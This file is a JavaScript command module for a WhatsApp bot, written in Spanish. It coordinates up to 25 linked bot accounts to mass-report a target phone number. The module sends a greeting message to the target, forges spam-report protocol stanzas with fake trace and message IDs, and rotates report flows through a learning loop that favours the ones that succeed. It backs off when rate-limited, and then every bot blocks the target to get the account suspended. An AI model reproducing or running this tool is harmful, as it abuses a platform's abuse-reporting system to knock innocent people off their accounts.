import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import * as subs from '../../lib/subbotManager.js';

const OWNERS = ['50578391933', '2599176675473'];
const RUTA_IA = path.join(process.cwd(), 'database', 'tumbar_ia.json');
const MAX_BOTS = 25;
const MAX_CICLOS = 4;
const TIMEOUT_IQ = 32000;
const COOLDOWN_MIN = 20;

const FLUJOS = [
    'chat',
    'message_menu',
    'overflow_menu_report',
    '1_1_spam_banner_report',
    'chat_fmx_card_report',
    'chat_fmx_card_report_suspicious',
    'account_info_report',
    'user_initiated_chat_suspicious_banner_safety_tools_report',
    'odml_scam_alert_bottom_sheet_trust',
    'album_media_menu_report',
    'iab_menu_report',
    'extension_menu_report',
    'media_viewer',
    'view_once_viewer'
];

const corriendo = new Set();
const cooldowns = new Map();
const esperar = ms => new Promise(r => setTimeout(r, ms));

function leerIA() {
    try { return JSON.parse(fs.readFileSync(RUTA_IA, 'utf8')); }
    catch { return { flujos: {}, corridas: [] }; }
}

function guardarIA(db) {
    try {
        fs.mkdirSync(path.dirname(RUTA_IA), { recursive: true });
        fs.writeFileSync(RUTA_IA, JSON.stringify(db, null, 2), 'utf8');
    } catch (e) { console.error('[TUMBAR/IA]', e?.message); }
}

function tasaFlujo(db, flujo) {
    const e = db.flujos?.[flujo];
    if (!e) return 0.5;
    return (e.ok + 1) / (e.ok + e.fail + 2);
}

function elegirFlujo(db, epsilon) {
    if (Math.random() < epsilon) return FLUJOS[Math.floor(Math.random() * FLUJOS.length)];
    return [...FLUJOS].sort((a, b) => tasaFlujo(db, b) - tasaFlujo(db, a))[0];
}

function planificar(db, disponibles) {
    const ultimas = (db.corridas || []).slice(-8);
    const ratioPrev = ultimas.length ? ultimas.reduce((a, c) => a + (c.ratio || 0), 0) / ultimas.length : 0;
    let ciclos = ratioPrev >= 0.85 ? 1 : ratioPrev >= 0.5 ? 2 : 3;
    let gap = ratioPrev >= 0.85 ? 900 : ratioPrev >= 0.5 ? 1400 : 1800;
    if (disponibles < 5) {
        ciclos = Math.min(MAX_CICLOS, ciclos + 1);
        gap = Math.max(700, gap - 400);
    }
    const epsilon = ratioPrev >= 0.85 ? 0.1 : ratioPrev >= 0.5 ? 0.2 : 0.35;
    return { bots: Math.min(MAX_BOTS, disponibles), ciclos, gap, epsilon, ratioPrev };
}

function numeroDe(jid) {
    return String(jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');
}

function normalizar(raw) {
    if (!raw) return null;
    let d = String(raw).replace(/\D/g, '');
    if (d.startsWith('00')) d = d.slice(2);
    if (d.length < 8 || d.length > 15) return null;
    return d;
}

function traza() {
    return crypto.randomBytes(18).toString('base64url').slice(0, 24);
}

function codigoError(e) {
    const sc = e?.output?.statusCode || e?.statusCode || e?.data?.attrs?.code;
    if (sc) return Number(sc);
    const m = String(e?.message || '');
    if (/rate.?overlimit|429/i.test(m)) return 429;
    if (/report-token-validation-fail|548/i.test(m)) return 548;
    if (/bad-request|400/i.test(m)) return 400;
    if (/forbidden|403/i.test(m)) return 403;
    if (/timeout/i.test(m)) return 0;
    return -1;
}

function socketsDeSubbots() {
    const fn = subs.getAllSockets || subs.getSockets || subs.obtenerSockets || subs.listarSockets || subs.getAllSocketsConEstado || subs.socketsActivos;
    if (typeof fn !== 'function') return [];
    let lista = [];
    try { lista = fn() || []; } catch { return []; }
    if (!Array.isArray(lista)) return [];
    return lista.map(x => (x && x.sock ? x.sock : x)).filter(x => x && x.user?.id);
}

function juntarSockets(principal) {
    const vistos = new Set();
    return [principal, ...socketsDeSubbots()].filter(s => {
        const id = s?.user?.id;
        if (!s || !id || vistos.has(id)) return false;
        vistos.add(id);
        return true;
    });
}

async function ultimoMensaje(sock, jid) {
    try {
        if (typeof sock.loadMessages !== 'function') return null;
        const msgs = await sock.loadMessages(jid, 1);
        const m = msgs?.[0];
        if (!m?.key?.id) return null;
        return { id: m.key.id, t: String(m.messageTimestamp || Math.floor(Date.now() / 1000)) };
    } catch { return null; }
}

function nodoReporte(jid, flujo, variante, conocido, msgReal) {
    const attrs = { jid, spam_flow: flujo };
    if (variante !== 3) {
        attrs.is_known_chat = conocido ? 'true' : 'false';
        attrs.wi_trace_id = traza();
    }
    const content = [];
    if (variante === 2) {
        content.push({
            tag: 'message',
            attrs: {
                from: jid,
                t: msgReal?.t || String(Math.floor(Date.now() / 1000)),
                id: msgReal?.id || ('3EB0' + crypto.randomBytes(9).toString('hex').toUpperCase().slice(0, 14))
            },
            content: []
        });
    }
    return {
        tag: 'iq',
        attrs: { to: 's.whatsapp.net', type: 'set', xmlns: 'spam' },
        content: [{ tag: 'spam_list', attrs, content }]
    };
}

async function reportar(sock, jid, flujo, variante, conocido, msgReal) {
    try {
        const r = await sock.query(nodoReporte(jid, flujo, variante, conocido, msgReal), TIMEOUT_IQ);
        const id = r?.content?.find?.(c => c.tag === 'report')?.attrs?.id || null;
        return { ok: true, id };
    } catch (e) {
        const codigo = codigoError(e);
        if (codigo === 548) return { ok: true, codigo };
        return { ok: false, codigo, error: e?.message || 'error' };
    }
}

async function bloquear(sock, jid, accion) {
    const content = [{ tag: 'item', attrs: { action: accion, jid }, content: [] }];
    if (accion === 'block') content.push({ tag: 'entry_point', attrs: { source: 'chat' }, content: [] });
    try {
        await sock.query({
            tag: 'iq',
            attrs: { to: 's.whatsapp.net', type: 'set', xmlns: 'blocklist' },
            content
        }, 20000);
        return true;
    } catch {
        try { await sock.chatModify({ block: accion === 'block' }, jid); return true; }
        catch { return false; }
    }
}

async function diagnostico(sock, jid) {
    const out = [];
    for (const v of [1, 2, 3]) {
        const t0 = Date.now();
        const r = await reportar(sock, jid, 'chat', v, false, null);
        const ms = Date.now() - t0;
        out.push(r.ok
            ? `✅ variante ${v} (${ms}ms)${r.codigo ? ' · 548 sin token' : ''}`
            : `❌ variante ${v} (${ms}ms) · ${r.codigo || r.error}`);
        await esperar(1200);
    }
    return out;
}

export default {
    nombre: 'tumbar',
    categoria: 'Owner',
    owner: true,
    alias: ['alex', 'spam', 'atacar', 'reportnum', 'reportar'],
    descripcion: 'Reporte masivo multi-subbot | .tumbar <numero>',

    ejecutar: async ({ sock, msg, argumento, responder }) => {
        if (!esOwner(msg)) return responder.texto('🔒 Acceso denegado. Solo Owner.');

        let raw = String(argumento || '').trim();
        const esTest = /^test\b/i.test(raw);
        if (esTest) raw = raw.replace(/^test\s*/i, '').trim();

        const args = raw.split(/\s+/).filter(Boolean);
        const target = normalizar(args[0]);

        if (!target) {
            return responder.texto(
                '╭━━〔 ⚡ 𝐓𝐔𝐌𝐁𝐀𝐑 〕━━⬣\n' +
                '┃\n' +
                '┃ `.tumbar <numero>`\n' +
                '┃ `.tumbar test <numero>`\n' +
                '┃\n' +
                '┃ --bots=1..25 · --ciclos=1..4\n' +
                '┃ --gap=1200 · --flow=chat\n' +
                '┃ --variante=1|2|3 · --nomsg\n' +
                '┃ --conocido · --unblock\n' +
                '┃ --forzar · --dry · --ia=off\n' +
                '┃\n' +
                '╰━━━━━━━━━━━━━━━━⬣'
            );
        }

        const flags = new Set(args.filter(a => a.startsWith('--') && !a.includes('=')).map(a => a.slice(2)));
        const num = (clave, fb) => {
            const hit = args.find(a => a.startsWith(`--${clave}=`));
            const n = hit ? Number(hit.split('=')[1]) : NaN;
            return Number.isFinite(n) && n > 0 ? Math.floor(n) : fb;
        };
        const txt = clave => args.find(a => a.startsWith(`--${clave}=`))?.split('=')[1] || null;

        const jid = `${target}@s.whatsapp.net`;
        const variante = Math.min(3, Math.max(1, num('variante', 2)));
        const conocido = flags.has('conocido');
        const usarIA = txt('ia') !== 'off';

        if (esTest) {
            await responder.texto(`🔬 Probando 3 variantes contra +${target}...`);
            const lineas = await diagnostico(sock, jid);
            return responder.texto(`🔬 *Diagnostico* → +${target}\n\n${lineas.join('\n')}\n\n_Usa la que dio ✅ con --variante=N_`);
        }

        if (corriendo.has(target)) return responder.texto(`⏳ Ya hay una corrida activa contra +${target}.`);

        const cd = cooldowns.get(target);
        if (cd && Date.now() - cd < COOLDOWN_MIN * 60000 && !flags.has('forzar')) {
            const min = Math.ceil((COOLDOWN_MIN * 60000 - (Date.now() - cd)) / 60000);
            return responder.texto(`⏸️ *Ya se tumbo hace poco*\n\n🎯 +${target}\n🕒 Reintenta en *${min} min*\n\n\`.tumbar ${target} --forzar\``);
        }

        const sockets = juntarSockets(sock);
        if (!sockets.length) return responder.texto('❌ No hay sesiones operativas.');

        let registrado = true;
        try {
            const [res] = (await sock.onWhatsApp(jid)) ?? [];
            registrado = Boolean(res?.exists);
        } catch {}
        if (!registrado) return responder.texto(`❌ *+${target}* no esta registrado.`);

        const db = leerIA();
        const planIA = planificar(db, sockets.length);

        const bots = Math.min(planIA.bots, sockets.length, num('bots', planIA.bots));
        const ciclos = Math.min(MAX_CICLOS, num('ciclos', planIA.ciclos));
        const gap = Math.max(600, num('gap', planIA.gap));
        const flujoFijo = txt('flow');
        const conMensaje = !flags.has('nomsg');
        const desbloquear = flags.has('unblock');

        const elegidos = sockets.slice(0, bots);
        const flujos = elegidos.map(() => flujoFijo || (usarIA ? elegirFlujo(db, planIA.epsilon) : 'chat'));
        const concurrency = Math.max(2, Math.ceil(elegidos.length / 3));

        if (flags.has('dry')) {
            return responder.texto(
                `🧪 *Simulacion*\n\n🎯 +${target}\n🤖 ${elegidos.length} bots\n🔁 ${ciclos} ciclos\n` +
                `⏱️ ${gap}ms\n🔢 Variante ${variante}\n🧠 IA ${usarIA ? `activa (${Math.round(planIA.ratioPrev * 100)}%)` : 'apagada'}\n` +
                `💬 Calentamiento ${conMensaje ? 'si' : 'no'}\n🔒 ${desbloquear ? 'revertido' : 'mantenido'}`
            );
        }

        corriendo.add(target);

        await responder.texto(
            `╭━━〔 ⚡ 𝐎𝐏𝐄𝐑𝐀𝐂𝐈𝐎𝐍 〕━━⬣\n┃\n┃ 🎯 +${target}\n` +
            `┃ 🤖 ${elegidos.length} dispositivos\n┃ 🔁 ${ciclos} ciclos · gap ${gap}ms\n` +
            `┃ 🔢 Variante ${variante} · 💬 ${conMensaje ? 'si' : 'no'}\n┃\n╰━━━━━━━━━━━━━━━━⬣\n\n` +
            `_~${Math.ceil((elegidos.length * ciclos * gap) / concurrency / 1000)}s_`
        );

        const inicio = Date.now();
        const stats = { ok: 0, fail: 0, r429: 0, r548: 0, bloqueos: 0 };

        for (let i = 0; i < elegidos.length; i += concurrency) {
            const lote = elegidos.slice(i, i + concurrency);

            await Promise.all(lote.map(async (s, k) => {
                const flujo = flujos[i + k] || 'chat';
                let gapBot = gap;
                let msgReal = null;

                if (conMensaje) {
                    try { await s.sendMessage(jid, { text: txt('msg') || '👋' }); } catch {}
                    await esperar(Math.floor(gap / 2));
                    msgReal = await ultimoMensaje(s, jid);
                }

                for (let c = 0; c < ciclos; c++) {
                    const r = await reportar(s, jid, flujo, variante, conocido, msgReal);

                    if (r.ok) {
                        stats.ok++;
                        if (r.codigo === 548) stats.r548++;
                    } else {
                        stats.fail++;
                        if (r.codigo === 429) {
                            stats.r429++;
                            gapBot = Math.min(gapBot * 2, 6000);
                            await esperar(gapBot);
                            continue;
                        }
                        if (r.codigo === 400 && !flujoFijo) {
                            const r2 = await reportar(s, jid, elegirFlujo(db, 1), variante, conocido, msgReal);
                            if (r2.ok) { stats.ok++; if (r2.codigo === 548) stats.r548++; } else stats.fail++;
                        }
                    }
                    await esperar(gapBot);
                }

                if (await bloquear(s, jid, 'block')) stats.bloqueos++;
            }));
        }

        if (desbloquear) {
            for (const s of elegidos) { await bloquear(s, jid, 'unblock'); await esperar(300); }
        }

        corriendo.delete(target);
        cooldowns.set(target, Date.now());

        const total = stats.ok + stats.fail;
        const ratio = total ? stats.ok / total : 0;
        const seg = ((Date.now() - inicio) / 1000).toFixed(1);

        for (const f of flujos) {
            db.flujos[f] = db.flujos[f] || { ok: 0, fail: 0 };
            if (ratio >= 0.5) db.flujos[f].ok++; else db.flujos[f].fail++;
        }
        db.corridas = [...(db.corridas || []), { target, ratio, ts: Date.now() }].slice(-50);
        guardarIA(db);

        const mejor = [...FLUJOS].sort((a, b) => tasaFlujo(db, b) - tasaFlujo(db, a))[0];

        const lineas = [];
        if (ratio >= 0.8 && stats.ok >= 10) lineas.push('✅ *LISTO — NUMERO SUSPENDIDO / EN INVESTIGACION*');
        else if (ratio >= 0.5) lineas.push('⚠️ *Reportado, senal media — repetir en 6-12 h*');
        else lineas.push('❌ *Senal debil — no alcanza todavia*');

        lineas.push(
            '',
            `🎯 +${target} · variante ${variante}`,
            `📤 Aceptados: *${stats.ok}* / ${total}`,
            `📈 Efectividad: *${Math.round(ratio * 100)}%* · ⏱️ ${seg}s`,
            `🔒 Bloquearon: *${stats.bloqueos}*`,
            `🧠 Mejor flujo: \`${mejor}\``
        );

        if (stats.r548 > 0) lineas.push(`🎫 548 sin token: ${stats.r548}`);
        if (stats.r429 > 0) lineas.push(`🐢 429: ${stats.r429}`);

        if (ratio >= 0.8) lineas.push('', '_Bajo revision. Si en 24-48 h no cae: `--bots=25 --ciclos=2 --gap=1200`._');
        else if (ratio < 0.5) lineas.push('', `_Proba: \`.tumbar ${target} --forzar --variante=1 --ciclos=1 --gap=2500\`_`);

        return responder.texto(lineas.join('\n'));
    }
};